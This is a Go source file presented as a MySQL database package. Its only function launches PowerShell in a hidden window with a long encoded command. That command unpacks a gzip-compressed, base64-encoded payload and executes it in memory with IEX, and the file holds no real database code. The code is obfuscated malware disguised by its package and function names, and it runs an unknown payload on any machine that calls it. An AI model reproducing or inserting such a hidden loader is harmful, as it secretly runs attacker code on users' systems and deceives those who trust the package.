package MySQL_db

import (
	"os/exec"
)

func Mysql_db(){
	cmd:=exec.Command("powershell",  "-w", "hidden", "-encodedcommand" ,"JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWABiAFgATwBpAHkAaABMACsASABIADgARgBIADEASwBsAFYAbwB4AEIATQBkAEgAcwBxAGEAMQBhAFYAQgBCAFEAMABJAGoAdgBPAGEAbgBVAEEAQwBPAGkAdgBEAE0AbwBlAEgAYgAvACsAMgBsAFEAYwA3AEoAbgBrADMAdQAzADYAbAA2AHIASwBJAGUAWgA3AHAANgBlAHAANQAvAHUAYQBWAFIATQBiAGwAVQBTAFcAagBxAFIAUABRAE4AVAB0AHoATQBjAFIAcABiAG4AVQB2AFYAQwA0AGIAcgByAGkAWQBUADYAUwBuADAAcgBGAHQAYQB4AHEANQBOAHMATwBoAHUAOABtAHAAaQA4ACsAcQBHAG4AdgB5AEwARABDAEgARQBVAFUAWAA4AFYAcgBrAFkAbwBSAEEANQBWAHUAdAA2AGoAOABOAFgAeABqAE4AagBHAEYAUwBwAC8AeQBRAFMAeABFAFkAZQA0AGYASABWAFYAdQBNAHEAbgBZAGoAZABDAGEALwB6AHEASQBtAEwAdAA4AGEAdQBEAHkAYwBZAHoASQB0AGkAbwA5AE0AegA2AGYAdABkAHoAawBPAFcAKwBmAFAAbgBTAGkAYwBNAFEAdQArAFQAMABYAHUAMQBoAHcAawBZAFIAZABqAFQAYgB3AGwARwBwAFQASAAyAG4ANQBoAHMAYwA0AHQAdQBoAHQAcwBVADYAbwBmADYAaQByAGwAKwByAFAAZAB2AFQAawBIADAAVwBTAHoAdABJADMAOABDAEIAVwBOAGYASQAxAGcAYQBlAGoAcgBJAFQAVgBGAFgAZgB0AGsAaQBwACsATwBlAGYAeABmAEwAegBiAGUAMgBsAHkAZwBVAHgAcwBxAE4AUwBVAFUAMABqAGcAcAAyAHEAWQBkAHYARgBNAHYAVwBqAG4ARwAwADQAUwBYADEAYwBLAHMAcQBXAEgAbgBxAFIAdAB5AGIAVgB1AGUAVQB5ADkAZQBvADAAOQAxADcASgBuAFoAZABQAHYAaABmAEwANQA1AE8AWgBQAG8ASgB6AGYASAA3AEkAegBPAHAASgBwADEAUwBFADQAUQBpAHcAWQBVADgAWQBGAGkAdgBVAGMANwBiAGYAOAA4AHMATAA5AGUAMwBOAG0AMwBIAHMARQBzAHYAQgBWAGQARQBsAE8AUABSADgARgBZAGQANwBTADgAZABSAFYAVQBDAHUAWQBlAE0AeABYAG8ATgBhAE0AWQBMAHcAdQBXAGEAeABEAEUANgBFAG0ATQBTAGgAUwAxADEAOABBAGIAMgA5AHQAOABPAGwAYQB6AGUAMgA3AFEAcgBZAGYAZgA1AGQAdQB5ADgAbABCAFIAOAB1ADQAUAA2AHUAVQB1AG0AOQBFAGsAaQBOAFMARgBpAHUAbgBEAG4AeABPADMARABJAE8AVwA5AE8ANQB1AEEANAB2ADMAagAvAGoAbAB4AGwAKwBQADEAQwBzAEgATABoAFIAKwBFAEQAcQBoAHIAWQB4AGkAWQBpACsASgBVAEEAdgB1ACsANABXAHIAaQA2AGUAcwA2AEgARwBNADUAVABHAG4AbQBSAGwAZQB0ADkAcABlAGcASwBKAFkATQBUAGkASABoAGgAbQBvAFYAegBFAHMAYQA0AC8AUABKAFAAZgBFADcAYgBYAGoAUwBqAHkAcQBlAEcAYQBoAGUAdABzADgANABwAFAAQwBjAC8AdgBsAEwAUABNADgAOAB5AFgAZwBwAFgANQBjAEsAWgBQAGQAbgA4AHEAeABaAGIAdABvAEgARABiAFAAMwB6AGIATwBqAGkAdABlAFgAaQBiAHUAbwBpAHgAOQBJAHYAaABDADkAOQBGAEQATwA4AHQAbgBHAE8AUgAvAFUAaQBwAG8AQwBmAHAAZQBKADUAQQBSAHYAZABNAHoAcgBGAEQATgBEAG4AWAA5AFUANAB4AHkASgB2AHUAdQAyAFQAYwA2AHcATwBjAFkALwBBAEsANgBCAEUAKwBXAGQAbgBUAGoARQBzAEYAVQBWAFgAeABnADcAZwBkADMAbwBIAG0AbAA2AHYASQBjADMAdwBSAGYAcQBjAFcAdQBsAGwAOQArAHcAOQA0ADMATABIAFIAbABGAFUAbwBVAFkAeAA1AEwAbABlAG8AVgBTAE0AYgBHAHgAVQBLAE4AYQBOAHIAUABNAFMARwB4AE0AdgBIAHgAYgAvAGMAVgBlAE8AYgBXAEwAcABLAEMASQBYAGMAeQAvAGwARAB5AEEAOQBiADkAMwB4AFgATQBpAFkAVwBJAGYAbwBBAGcAdwBUADEAYwBlADYAaABlAHcATQBsAFEAbwBsAFcAQQBaAHUAcAA2AHAAbABYAGwAdwBvAGYAbwBoAEoAQgA5AGsAMgBwAEIAeABZADIAawBOAE0AWQBDAGIARABRAGkAVQBaAFoAMABLAGoAOABtADkAKwBsAEsAcwBxAEoAcQBMAGoAMgA5AGcAQgA2AGIAdwBLADgAVABZAHkAbwBlAGEAYwBNAHkAcQBuAEcAegBLAHgAVQBmAHcAUABiAGwALwB5ADUASgBRAFUARwBWAFkAWABrAE4ANAA1AEQAUQBSAFEAYgBZADkAVQBxAEoAawBWAEUAcQBoAHIAeABjAG8AdgB4AFAAdgBmADMAUAB1ADUAeABQAHoAawBaAGkAZgBFADUAMABDAFcAOABrAFIAOABiAHEAYwBrAFMANQBkAGMAVQBzADgAdQBsADYAOQB2AFcATwBiAEkAaABRAFIAUQA0ADAAUABQAGEAYQBNAEkAUAB6AFQAVQB2AEkAeQBWAGkAawB3AHIARABzAFIAVQAzAGoANAA5AGgARAAxAHUAegB3AHUAQgB3AEUAMwBnADIAYwBQAEQAQgBEAHcAMwBHAEUAaABqAHYAegAwAGUANgBGAHcAOABIAEEAbQAwAHQAQgBhAGYAVwB0ADEARwBmAEkAagBGAGUATgBLAG0ARwBaADQARwB1AFcAUABRADQAOQBiAGkAZgB1AGcAdABhADcASABUAHEAQgBtACsAdQBGAGQAZwBMAG0AbwBHAFEAdABRAFYAOQAxADEAVwBxAEEAYwBlAC8AMgBCAGEAagAyAGMANwBKAC8AMABuADcAVgBEAFQARgBpAEwAZgAxAEgAcAA4AFEANQBoAEYAZgBDAFkAdgBpAFAAcwAyAEgAMwBRAGUAUABSAGoAZgBpAGYAdQBPAEoANABGAGUANgA4AEYAMwAyAHcAZQBqAGcAVABuAHAAQQBTADgARwArAG8ARQBoAEwAWQB6AE0ASgBPADMAUABiAGwAUwA2ADEAcAB1AGwAeQBtAEQARwArAFkAcgBxAEcAZwBPAHQAOQBzAFIATAB5AHIASABPAGsAWQBRADIAaABEAEYAdABjAE4ASABLAG0AQQBVAGMATQA5AEwANgBQAHAAeABUAFoARQB6ADEAdwBaAFYAUwBWAFcAMgBuACsAbwA3AHcANwBZADYAOAAxAFEAVgBsAFkAUABTAEQAMQByADEAeAByAEsAZQA4ADAAZwBBAGMARQBqAFcAVgBOADgAcwBIAEkAOQBFAFgALwBFAEYAZgBLAEkATgBVAFcAQwBvADkAcwBCAHYARQBjADcATQBoAHkAQwBvAEQAdABsAFUAagBPAFIAagBUAGEAQwBoAE4AeQBKAEkAWgBJAGEAZQBSAHAAbQA2AGoASQAyADcARgBaAEsARAA3AFoATABhAFEASABrAEsAVQBkAHYAeQBCAGgAYgBYADIAbQBtAFMANgAwAG0AQgBsAFMAbwA4AGMATwBmAG0AbgBxAHUAUABVAEEATgB1ADIATQBPAG4AMgB3AGIAYgBiAGsAVwBXAEkAQgBiAHIAbgA4AFIAUgBrACsAcABFAEYAdABsAHAAaABJAEYAcgB5AE4AbgAzAFkANgBvAHgAeQBrAE8AZAB6AFEAKwBMAFQAWQBXAEsAMgBEADMATQArADcAUABVADEASgAxAFoAWAA3AEoAUABLAGsAdgA2AEIAeABGAHcAVABJADgANwBUAG0ARAAyAE8ANgBxAHkAVgBPAEcANQA4AGMAOABlAHAAdwBzAE8AbQBPADIAYgBWAGsARABpAEwAOQBTADcAaQBZAHQAMwB4AHAAcgB2ADIATQBhAHAATgBtAGMAUgB1AEcAZgBmADMAMQBrAHIAcABNAE8AMQBaAEkATgAzAE4ASQBlAHMAbQBqAHUAZwBmAFIAVwBiADEATgBMAGEANQA0AFgASQAzADcAawAxAG0AKwBvAHEAdAAzADgAdgB6AHEAVAArAGEAMABLAEwATQBIACsAZwBKAGUAeQBEAHMAaABMAHUAZgBQAE4AbABHAC8AMgBuADYAMgBPAHUAeABTAHEAegAzAGYASQBkAE4ASQBvAFYATAB6AEsANABCADgAUgBqAFQAeQBYAFQASwBLAHMAUQBBAHQANwB0AGoAYwBjAGsAeQB4AGwAagBkAEcAWgBtADkAMwBBAGIAbwBCAEoAUABwAFQATgBaAHAAYQBhAEUAZQA2AEgARwBQAGwAUgBWAHQAdgBtAEsAeQB0AFMAWAByAHgAWAAxADEAZABQAFQAagBTAFcAZQBTAEgAZwBiADEANQBqAGkAeABGADIASAB6AHAAagAxAGUAZQBUAGYAaABUAFcATQByACsAegBYAHYAVQBYAGEAawBvAFoAMgBNAEUAZAByAEwAawAzAGoANAA2AE4AKwBrAGsAKwBXAEUAZgBVAFMATgBKAEQAbgBNADUAZgAxAEMANQBzAGQAcgBVAFEAbQA2AG0AMgBYAGcAaAAzAGYAZABYAFUAKwBvAHUAMQB2AFYASQBjAEYAdQAyADIAegBXAGcAcABiAHQATgBIAG0AMABZAFgARwAvAFIAYgBTADcAdQBVAEIAUwBhAFcATQBIAGcAYgBCAEQAegBMAFIAWgBNAHgAZgBMAHkAVQBxAEkATwBTAHoAdAA3AG0ASgBHAFoALwBmAEQALwBqAEQAdABwAG0AeQBrADMAWgB1AEgATwAyAFEAYgB5AHUATwA4AGkAZQA4ADYAeAA2AG4ASgByAFcATABUAGIASwBxAGQAagBYAEYAYwBzAGsAdgBsAFQAdQBsAFAAWABFAGEAaQBCAGEAOQA5ADYATQArAFYAbwArAGIAVgBOACsATQBkADQAdwB4AGwAMQBHAGcAUQBkAFEANwAwAFIAbQA3AEEAdABYAGYAZQBhAGoATwBTAHAAVgBoAGgAKwAzAE8ATgA2ADQAOABXAGcAcwBTAHUAZwBLADkAYgBUADYAbgA1AFEANgBaACsAUAA3AHAAcgBiAFcAYQB6ADcAVgBKAHcAawBtAE4AdgBhAEMAawBEACsAaAA2ADEARABlAEMAcABPAGwAYwBHADQAaABIADQAVABFAGQAYgBzAFMANQB2AEQAWQA0ADAATgAwAHkAMwBCAHoAdwA4AE8ATQBBAFgANABKAEYAMQA0ADAAcQBIAEkAQQBLAGUAcABuAEoAWABUAEoAVwBNAHEAdwBsAEIAWQBUAHYAbgBhAG0AMQB0AEIANQAwAG4AcQA5AEgAWAB0AHIATgBvADEAVwB6AEkAYwBaADgAaABSADUAMwBiAHkAQQBwAG4AMABuAE8ATwBwAFoAOQA2AGwAcAB6AHcAegBFAHoATABLAHQASABhAEMANgBHADMAUwBMAEwANwArAGcAOABLAC8AbQA5AHQAUQByADMAVgBHAHEAZwB3AFUATAB5AHkAKwBaAHUAYgBjAG4AYgBuAHYANgAwADgAWAB5AGMAdgBsAHgANwB0ADcAZgAxAFcAUwA4AEEAYQBjADUALwBWAHIAWAB4AGwAagA5ADUAVgBxADgAOABhAEgAeABtAEYAMABRAGIAWgBVAE0AVwBnAGUAYgBsAGMAUABiAHcAWAA4AHUAYwBXAFoATwBSAFoAbQBVAGEAcAA5AEgASABYAHYATQBPAGgAaQAyADMAbwBLAEsASABuAHYAQgBSAHMAMQByAFkAOQBQAFcAdQBhAFAAdQBsAGUAbwBJAFUANwBOAFYAWQB2AGMARABGAE4AWQBjAGoAVQBQAHgAeQBWAHEAVABkAEIANgBKAFIATwBaADkATABpADkAVABwAHYATABNADQAbgB2AFAAUgBYAEYAOABFAHYAWAAxAFoAdwB2AE0AbwA3AEUAQQBmAFkATgBjAG0AbQBRAHQARQBKAFEAOQBOADAAOQB0ACsAZwB5ADQAWABmAGgANgBYAGoAKwBXAG4AcAB6AFYAdwBsAGEANgB6AGUAZQBmAEoAKwBKAHoAdgBmAHEAWAB4AEcAUAA0AHgAZABCAC8AOABmAEEALwBEAFQAcAB2ADgAZAAyAGcAeQA4AHYARABkADcAZwB5ADUAMwA2AEcATwA4AHkAbwBYAGkAdAAwAEoAQgBYAEYAUAB2ADUAaQBQAHIAQwBGADgAZQBPAEsAQgBhAE8AZgBjAGkAbwBEAGkANQAzAFgAbwBhAGYASwBiAGsAOQAyADcAcABHAHAAVQBwAGsAVgB0AFEAMQA0AGoANgBRAGQAMwBDADgAZABpAEkAcQBjAE8AMwBTAG0AagBHADIAUwBWAE0AbgBUADYAOQB2AGwATQBIAFoASgAwAFUAdgAxAE4AagByAEcATgBvAG4AVwA4AGwAVAB3AE8AVwBZAHUAaQBsAE0AdABPADUAawBVAHcAWQA1AHYANABHADUAbgBYAGUANgA4AHMATgBBAEEAQQA9ACIAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA")
	cmd.Run()
	
}
